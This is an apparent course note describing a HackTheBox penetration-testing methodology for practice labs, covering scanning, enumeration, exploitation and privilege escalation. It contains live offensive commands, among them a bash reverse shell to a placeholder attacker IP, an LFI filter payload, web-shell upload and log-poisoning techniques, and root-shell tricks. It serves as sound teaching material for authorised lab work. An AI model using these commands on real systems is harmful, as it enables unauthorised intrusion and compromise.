---
tags: [ctf, practice, lab, vapt]
difficulty: intermediate
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.28 HTB Methodology"
---

# 60.28 HackTheBox Machine Walkthroughs Methodology

## Introduction to HackTheBox (HTB)

HackTheBox (HTB) has established itself as the premier online platform for testing, refining, and advancing penetration testing and cybersecurity skills. The platform provides a vast, rotating array of intentionally vulnerable virtual machines (referred to as "Boxes"), ranging from introductory levels to "insane" difficulties that mirror advanced Persistent Threat (APT) scenarios. 

Operating within the HTB environment accurately mimics real-world penetration testing engagements. Practitioners must commence from external reconnaissance with zero prior knowledge, identify a vulnerable service to gain an initial foothold, establish persistence, and ultimately escalate privileges to achieve full system compromise (root on Linux, SYSTEM on Windows).

Developing a consistent, structured, and repeatable methodology is the single most crucial factor for success on HTB, and these habits directly translate to professional Vulnerability Assessment and Penetration Testing (VAPT) methodologies. This document outlines a comprehensive, battle-tested methodology for systematically compromising HTB machines.

## The HTB Pentesting Lifecycle

The HTB methodology is inherently cyclical and iterative. Discoveries made in later stages (like finding internal credentials) frequently require the tester to pivot back to earlier stages (like re-authenticating to external web services).

1. **Information Gathering & Reconnaissance (Enum)**
2. **Vulnerability Analysis & Service Enumeration**
3. **Exploitation & Gaining a Foothold**
4. **Post-Exploitation & Situational Awareness**
5. **Privilege Escalation (PrivEsc)**
6. **Lateral Movement / Pivoting (If applicable in Pro Labs)**

## ASCII Diagram: The Definitive HTB Attack Methodology

```text
+-----------------------+      1. Port Scan &   +-----------------------+
|                       |      Dir Busting      |                       |
|      Attacker         | --------------------> |    Target Machine     |
|   (Kali / Parrot)     |                       |    (IP: 10.10.10.x)   |
|                       | <-------------------- |                       |
+-----------------------+    Service Banners /  +-----------------------+
        |                        Web Pages              |
        |                                               |
        v                                               v
+-----------------------+                       +-----------------------+
|  2. Analyze Findings: |                       |  Services Running:    |
| - SMB/RPC Shares      |                       | - 21 (FTP), 22 (SSH)  |
| - Web App Tech Stack  |                       | - 80/443 (HTTP/S)     |
| - DNS Zone Transfers  |                       | - 445 (SMB), 389(LDAP)|
+-----------------------+                       +-----------------------+
        |
        | 3. Exploit Delivery & Weaponization
        v
+-----------------------+                       +-----------------------+
|  Foothold Secured     |    Reverse Shell      |                       |
|  (User.txt)           | <-------------------- |  Low Priv Execution   |
|  TTY Upgraded         |                       |  (www-data, svc_usr)  |
+-----------------------+                       +-----------------------+
        |
        | 4. Internal Enum (LinPEAS/WinPEAS, BloodHound)
        v
+-----------------------+                       +-----------------------+
|  5. Priv Escalation:  |                       |  System Weaknesses:   |
| - SUID binaries / Caps|                       | - Unquoted Path Serv  |
| - Kernel Exploits     |                       | - Cron Jobs / Timers  |
| - Cleartext Passwords |                       | - SeImpersonatePriv   |
+-----------------------+                       +-----------------------+
        |
        | 6. Root/SYSTEM Exploit Execution
        v
+-----------------------+                       +-----------------------+
|  Full Compromise      |      Root Shell       |                       |
|  (Root.txt)           | <-------------------- |  Highest Privileges   |
|  Hash Dumping (SAM)   |                       |  (root, SYSTEM)       |
+-----------------------+                       +-----------------------+
```

## Phase 1: Reconnaissance & Enumeration

The absolute foundation of a successful compromise is exhaustive enumeration. The community mantra is "Enum, enum, enum!" If you are stuck, you likely haven't enumerated enough.

### 1. Port Scanning Architecture (Nmap)
Start with a rapid, broad scan to identify immediately accessible ports, then follow up with a targeted, intensive, and slow scan to uncover hidden services.

*Initial Quick Discovery Scan:*
`nmap -sC -sV -oA nmap/initial <TARGET_IP>`

*Comprehensive All-Ports Scan (Time-consuming but mandatory):*
`nmap -p- --min-rate=1000 -T4 -v <TARGET_IP>`

*Deep-Dive Detailed Scan on Discovered Ports:*
`nmap -p <open_ports_comma_separated> -sC -sV -A -oA nmap/detailed <TARGET_IP>`
*Pro-tip: Always output Nmap results to files (`-oA`) to avoid rescanning and generating unnecessary noise.*

### 2. Web Application Enumeration (Ports 80, 443, 8080, 8443)
If web services are exposed, they are statistically the most likely initial attack vector.

- **Virtual Host (VHost) Routing:** HTB machines heavily rely on name-based virtual hosting. If an IP resolves to a default page, always attempt to map the machine name to the IP in your `/etc/hosts` file (e.g., `10.10.10.x target.htb`).
- **Fuzzing VHosts and Subdomains:** Use `ffuf` to discover hidden developmental or administrative subdomains.
  `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://target.htb -H "Host: FUZZ.target.htb" -fw <base_word_count>`
- **Aggressive Directory Busting:** Search for hidden administrative panels, API endpoints, or backup files (`.bak`, `.zip`, `.sql`).
  `feroxbuster -u http://target.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,bak`
- **Technology Profiling:** Utilize tools like Wappalyzer, `whatweb`, or `nikto` to identify the framework, CMS (WordPress, Joomla), and backend languages.

### 3. Deep Service-Specific Enumeration
- **SMB (445) / RPC (135):** Check for anonymous or null session access. Enumerate users, groups, and available network shares.
  `smbclient -N -L //<TARGET_IP>`
  `crackmapexec smb <TARGET_IP> --shares --users`
- **FTP (21):** Specifically test for `Anonymous` login. Check if FTP data directories overlap with Web directories (allowing file upload to web shell execution).
- **DNS (53):** Attempt DNS Zone Transfers to reveal all subdomains and internal IP mappings.
  `dig axfr @<TARGET_IP> target.htb`
- **LDAP (389, 636) / Kerberos (88):** Critical for Windows/Active Directory boxes. Use `ldapsearch` to dump domain information and users.

## Phase 2: Vulnerability Analysis & Foothold Acquisition

Once services and versions are thoroughly enumerated, correlate this data with known vulnerabilities or logic flaws.

### 1. Exploiting Known Vulnerabilities (CVEs)
Utilize `searchsploit` or online databases (Exploit-DB, NVD, GitHub) to locate public exploits for specific software versions identified via Nmap.
*Example:* `searchsploit Apache 2.4.49` reveals a critical Path Traversal/RCE vulnerability (CVE-2021-41773).

### 2. Custom Web Application Attacks
Look for bespoke vulnerabilities introduced by the application developers:
- **SQL Injection (SQLi):** Target login forms, URL parameters, or HTTP headers (like User-Agent). Extract credentials or use `INTO OUTFILE` to write web shells.
- **Local File Inclusion (LFI):** Attempt to read local source code (`index.php?page=php://filter/convert.base64-encode/resource=index`) to find hardcoded database credentials, or read `/etc/passwd` to identify valid system users.
- **Unrestricted File Upload:** Attempt to upload malicious scripts (`shell.php`, `shell.aspx`). Bypass client-side filters by intercepting the upload with Burp Suite and modifying the `Content-Type` or file extension.

### 3. Weaponization and Shell Acquisition
The immediate goal is Remote Code Execution (RCE). Once achieved, transition the execution into an interactive reverse shell.

*Standard Reverse Shell Payload (Bash):*
`bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'`

*Catching the Shell (Netcat / Pwncat):*
`nc -lvnp 4444`

*Crucial Step: Upgrading a TTY Shell*
A raw netcat shell is unstable; Ctrl+C will kill the connection. You must upgrade it to a fully interactive TTY:
1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. Press `Ctrl+Z` (Backgrounds the netcat session)
3. `stty raw -echo; fg` (Configures terminal to pass raw keystrokes, brings netcat to foreground)
4. `export TERM=xterm` (Allows clearing the screen and using text editors like nano/vim)

## Phase 3: Situational Awareness & Internal Enumeration

Upon securing a low-privileged shell (e.g., `www-data` or `svc_apache`), you must orient yourself within the target environment. Do not blindly run exploits.

### Linux Internal Enumeration
- **System Identification:** `uname -a`, `cat /etc/os-release`, `cat /etc/issue`
- **User and Privilege Context:** `id`, `whoami`, `sudo -l` (Can I run anything as root?), `cat /etc/passwd` (Who else is on this box?).
- **Network Topography:** `ip a`, `ss -tulpn` or `netstat -tulpn`. Look for internal services running exclusively on `127.0.0.1` (like a hidden MySQL database or internal API) that were inaccessible from the outside.
- **Automated Recon:** Upload and execute `LinPEAS` (`linpeas.sh`). This script comprehensively searches for misconfigurations, hardcoded passwords, and PrivEsc vectors.

### Windows Internal Enumeration
- **System and Patch Level:** `systeminfo`
- **User Context and Tokens:** `whoami /priv` (Crucial for identifying impersonation privileges), `whoami /groups`, `net user`.
- **Automated Recon:** Upload and execute `WinPEAS` (`winpeas.exe`) or the `Seatbelt.exe` tool from the GhostPack suite.

## Phase 4: Privilege Escalation (PrivEsc)

The ultimate objective is escalating from a low-level service account to `root` (Linux) or `NT AUTHORITY\SYSTEM` (Windows).

### Advanced Linux PrivEsc Vectors
- **Sudo Misconfigurations:** `sudo -l`. If allowed to run specific binaries without a password, consult GTFOBins (e.g., `sudo nmap --interactive` leads to a root shell).
- **SUID/SGID Binaries:** `find / -perm -4000 -type f 2>/dev/null`. Binaries that execute with the permissions of the file owner (usually root) rather than the user running it. Custom SUID binaries are a classic HTB vector.
- **Linux Capabilities:** `getcap -r / 2>/dev/null`. Similar to SUID, but more granular. E.g., `tar` with `cap_dac_read_search` can read any file on the filesystem, including `/etc/shadow`.
- **Cron Jobs and Timers:** Inspect `/etc/crontab` and `/etc/cron.d/`. Are there scripts executing as root on a timer that are globally writable, or use relative paths (susceptible to path hijacking)?
- **Shared Object Injection (LD_PRELOAD):** If `sudo -l` shows `env_keep+=LD_PRELOAD`, an attacker can compile a malicious C library and force a legitimate sudo command to load it, granting a root shell.

### Advanced Windows PrivEsc Vectors
- **Service Misconfigurations:** 
  - *Unquoted Service Paths:* If a service path contains spaces and lacks quotes (e.g., `C:\Program Files\App\srv.exe`), dropping a malicious executable at `C:\Program.exe` will cause Windows to execute the malware as SYSTEM.
  - *Insecure Service Permissions:* Using tools like `accesschk.exe` to see if your user can modify the `binPath` of a service running as SYSTEM.
- **Token Impersonation (Potato Attacks):** If `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (common for IIS web accounts), you can use exploits like JuicyPotato, PrintSpoofer, or RoguePotato to force a SYSTEM process to authenticate to you, stealing its token.
- **Windows Registry AutoRuns:** Applications set to start automatically upon boot that possess weak file or registry permissions.
- **Kernel Exploits:** If the machine is heavily outdated, kernel exploits (e.g., PrintNightmare, MS15-051) can be used, though they are generally considered a last resort due to system instability.

## Advanced Considerations and Pro-Tips

- **Identifying Rabbit Holes:** HTB creators are notorious for intentionally designing rabbit holes—services that are vulnerable but yield nothing, or highly complex rabbit holes designed to waste time. Timebox your efforts; if a vector yields no progress after 45 minutes, pivot to another finding.
- **Immaculate Note-Taking:** Proper documentation is non-negotiable. Utilize tools like Obsidian, Notion, or CherryTree. Document every executed command, its exact output, and your running hypotheses.
- **Pivoting and Tunneling:** In advanced HTB Pro Labs (like Dante or RastaLabs), compromising a single machine is merely the beachhead. You must utilize tunneling tools like `Chisel`, `sshuttle`, or Proxychains to route your attack traffic through the compromised host, traversing subnets to attack internal, highly segmented networks.

## Conclusion

Mastering HackTheBox is a relentless journey of continuous, hands-on learning. The methodology detailed above provides the structural framework, but the true artistry of VAPT lies in pattern recognition, adapting to uniquely engineered scenarios, chaining seemingly minor flaws, and maintaining absolute resilience in the face of complex, frustrating puzzles.

## Chaining Opportunities

- **LFI to Log Poisoning to RCE:** A low-severity Local File Inclusion (LFI) vulnerability can be escalated to full RCE. The attacker injects malicious PHP code into the Apache/Nginx `access.log` via a manipulated `User-Agent` header, and then utilizes the LFI to include and execute that poisoned log file.
- **SQLi to NTLM Hash Cracking to WinRM:** Extracting a Windows user's NTLM hash via a web SQL injection, cracking the hash locally using Hashcat, and subsequently authenticating to the target via Windows Remote Management (WinRM) to secure an interactive PowerShell session.
- **Internal Port Forwarding to SSRF:** Discovering a vulnerable internal service bound only to `127.0.0.1` via internal enumeration. The attacker uses SSH remote port forwarding (`ssh -R`) or Chisel to expose that internal port to their local Kali machine, allowing them to exploit the service as if they were directly on the network.

## Related Notes
- [[01 - SQL Injection]]
- [[02 - Local File Inclusion]]
- [[18 - Broken Access Control]]
- [[26 - CTF Challenge Walkthroughs Web Category]]
- [[30 - Building a Home Lab for VAPT Practice]]
- [[60.29 - TryHackMe Learning Path Mapping]]
